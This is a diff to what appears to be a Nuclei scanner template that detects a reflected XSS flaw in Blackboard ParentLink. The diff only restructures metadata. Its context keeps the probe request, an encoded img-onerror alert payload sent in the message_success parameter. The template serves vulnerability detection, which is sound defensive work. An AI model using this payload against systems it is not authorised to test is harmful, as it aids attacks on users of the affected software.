@@ -4,11 +4,10 @@ info:
   name: Blackboard ParentLink Reflected XSS
   author: r3naissance
   severity: medium
-  reference:
-    - https://help.blackboard.com/Community_Engagement/Administrator/Release_Notes
   tags: blackboard,parentlink,xss
+  reference: https://help.blackboard.com/Community_Engagement/Administrator/Release_Notes
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/main/blank?message_success=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E'
